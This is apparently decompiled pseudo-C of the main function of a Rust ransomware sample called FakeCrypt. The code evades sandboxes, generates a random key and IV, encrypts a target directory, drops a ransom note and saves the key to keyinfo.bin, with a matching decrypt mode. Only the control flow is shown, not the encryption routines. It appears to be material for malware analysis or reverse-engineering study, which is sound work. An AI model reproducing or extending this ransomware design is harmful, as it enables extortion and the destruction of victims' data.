void FakeCrypt::main()
{
    char *v0;  // [bp-0x168], Other Possible Types: unsigned long, unsigned long long
    unsigned int v1;  // [bp-0x168]
    unsigned int v2;  // [bp-0x168]
    unsigned long v3;  // [bp-0x160], Other Possible Types: unsigned long long
    int v4;  // [sp-0x158], Other Possible Types: unsigned long long [9], char *, unsigned long long
    unsigned int v5;  // [bp-0x158]
    unsigned int v6;  // [bp-0x158]
    unsigned long long v7;  // [sp-0x150]
    uint128_t v8;  // [bp-0x148]
    void* v9;  // [bp-0x130], Other Possible Types: unsigned long, unsigned long long
    unsigned long v10;  // [bp-0x128], Other Possible Types: unsigned long long
    void* v11;  // [bp-0x120]
    char v12;  // [bp-0x118], Other Possible Types: unsigned long
    char v13;  // [bp-0x118], Other Possible Types: unsigned long
    unsigned long v14;  // [bp-0x118]
    int v15;  // [bp-0x117]
    unsigned long long v16;  // [sp-0x110]
    char *v17;  // [bp-0x108], Other Possible Types: unsigned long long
    int v18;  // [bp-0x107]
    int v19;  // [bp-0x100], Other Possible Types: unsigned long long
    void* v20;  // [sp-0xf8]
    int v21;  // [bp-0x68], Other Possible Types: char *
    unsigned long long v22;  // [bp-0x60]
    unsigned long long v23;  // [bp-0x50]
    char v24;  // [bp-0x40]
    unsigned long long v25[9];  // [bp-0x38], Other Possible Types: unsigned long long
    unsigned long v26;  // [bp-0x30]
    unsigned long v27;  // [bp-0x28]
    unsigned long long v29[9];  // r12
    unsigned long v30;  // r14
    unsigned long v31;  // rbx
    unsigned long long v35;  // rdx
    uint128_t v36[2];  // rax
    int v37;  // xmm0
    uint128_t *v38;  // rax

    if ((char)FakeCrypt::stealth::is_sandbox())
    {
        v12 = &g_4d9350;
        v16 = 1;
        v17 = 8;
        *((uint128_t *)&v19) = 0;
        std::io::stdio::_print(&(char)v12);
        std::process::exit(1); /* do not return */
    }
    std::env::args(&(char)v12);
    v24.collect(&(char)v12);
    switch (v26)
    {
    case 3:
        v29 = v25;
        v27 = &v29[6];
        v30 = v29[7];
        v31 = v29[8];
        std::fs::metadata(&(char)v12, v30, v31);
        core::ptr::drop_in_place<core::result::Result<std::fs::Metadata,std::io::error::Error>>(&(char)v12);
        if ((int)*((long long *)&v12) != 2 && (char)v30.is_dir(v31))
        {
            if ((char)v29[4].equal(v29[5], "encryptdecrypt[+] Encrypting files in: [+] Dropping ransom note...\n", 7))
            {
                v23 = rand::rngs::thread::thread_rng();
                v8 = 0;
                *((uint128_t *)&v4) = 0;
                *((uint128_t *)&v21) = 0;
                v23.fill(&(char)v4);
                v23.fill(&(char)v21);
                v9 = v30;
                v10 = v31;
                v0 = &v9;
                v3 = <std::path::Display as core::fmt::Display>::fmt;
                v12 = &g_4d93a0;
                v16 = 2;
                v20 = 0;
                v17 = &v0;
                v19 = 1;
                std::io::stdio::_print(&(char)v12);
                FakeCrypt::fileops::encrypt_directory(v30, v31, &(char)v4, &(char)v21);
                v12 = &g_4d93c0;
                v16 = 1;
                v17 = 8;
                *((uint128_t *)&v19) = 0;
                std::io::stdio::_print(&(char)v12);
                FakeCrypt::fileops::drop_ransom_note();
                (char)v12.create("keyinfo.binCould not open key fileFailed to read key fileFailed to create key fileFailed to write keyFailed to write IV", 11);
                v1 = (char)v12.expect("Failed to create key fileFailed to write keyFailed to write IV", 25, &g_4d9518);
                v1.write_all(&(char)v4, 32).expect("Failed to write keyFailed to write IV", 19, &g_4d9530);
                v1.write_all(&(char)v21, 16).expect("Failed to write IV", 18, &g_4d9548);
                v9 = &g_4d9478;
                v10 = <&T as core::fmt::Display>::fmt;
                v12 = &g_4d93d0;
                v16 = 2;
                v20 = 0;
                v17 = &v9;
                v19 = 1;
                std::io::stdio::_print(&(char)v12);
                ::0x4531d0::core::ptr::drop_in_place<std::fs::File>(v2);
                core::ptr::drop_in_place<rand::rngs::thread::ThreadRng>(&v23);
                ::0x453290::core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v24);
                return;
            }
            if ((char)v29[4].equal(v29[5], "decrypt[+] Encrypting files in: [+] Dropping ransom note...\n", 7))
            {
                v4 = &g_4d9478;
                v7 = <&T as core::fmt::Display>::fmt;
                v12 = &g_4d93f0;
                v16 = 2;
                v20 = 0;
                v17 = &v4;
                v19 = 1;
                std::io::stdio::_print(&(char)v12);
                v9 = 0;
                v10 = 1;
                v11 = 0;
                (char)v12.open("keyinfo.binCould not open key fileFailed to read key fileFailed to create key fileFailed to write keyFailed to write IV", 11);
                v5 = (char)v12.expect("Could not open key fileFailed to read key fileFailed to create key fileFailed to write keyFailed to write IV", 23, &g_4d9488);
                v5.read_to_end(&v9).expect(v35);
                ::0x4531d0::core::ptr::drop_in_place<std::fs::File>(v6);
                if (v11 != 48)
                {
                    v0 = v11;
                    v4 = &v0;
                    v7 = core::fmt::num::imp::<impl core::fmt::Display for u64>::fmt;
                    v12 = &g_4d9410;
                    v16 = 2;
                    v20 = 0;
                    v17 = &v4;
                    v19 = 1;
                    std::io::stdio::_eprint(&(char)v12);
                    std::process::exit(1); /* do not return */
                }
                v36 = 0.index(32, v10, 48, &g_4d94b8);
                if (v35 == 32)
                {
                    v37 = v36[0];
                    *((uint128_t *)&v18) = v36[1];
                    v15 = v37;
                }
                v13 = 1;
                v5.unwrap(&v13);
                v38 = 32.index(48, v10, v11, &g_4d94e8);
                if (v35 == 16)
                    *((uint128_t *)&v15) = *(v38);
                *((char *)&v14) = 1;
                (char)v23.unwrap(&(char)v14);
                v0 = v30;
                v3 = v31;
                v21 = &v0;
                v22 = <std::path::Display as core::fmt::Display>::fmt;
                v13 = &g_4d9430;
                v16 = 2;
                v20 = 0;
                v17 = &v21;
                v19 = 1;
                std::io::stdio::_print(&(char)v14);
                FakeCrypt::fileops::decrypt_directory(v30, v31, &v5, &(char)v23);
                v14 = &g_4d9450;
                v16 = 1;
                v17 = 8;
                *((uint128_t *)&v19) = 0;
                std::io::stdio::_print(&(char)v14);
                ::0x453210::core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&v9);
                ::0x453290::core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v24);
                return;
            }
            if (!v26)
                core::panicking::panic_bounds_check(0, 0, &g_4d9460); /* do not return */
            v4[0] = v25;
            v7 = <alloc::string::String as core::fmt::Display>::fmt;
            v12 = &g_4d9360;
            v16 = 2;
            v20 = 0;
            v17 = &v4;
            v19 = 1;
            std::io::stdio::_eprint(&(char)v12);
        }
        else
        {
            v4 = &v27;
            v7 = <&T as core::fmt::Display>::fmt;
            v12 = &g_4d9380;
            v16 = 2;
            v20 = 0;
            v17 = &v4;
            v19 = 1;
            std::io::stdio::_eprint(&(char)v12);
            break;
        }
    case 0:
        core::panicking::panic_bounds_check(0, 0, &g_4d9560); /* do not return */
    default:
        v4 = v25;
        v7 = <alloc::string::String as core::fmt::Display>::fmt;
        v12 = &g_4d9360;
        v16 = 2;
        v20 = 0;
        v17 = &v4;
        v19 = 1;
        std::io::stdio::_eprint(&(char)v12);
        break;
    }
    std::process::exit(1); /* do not return */
}
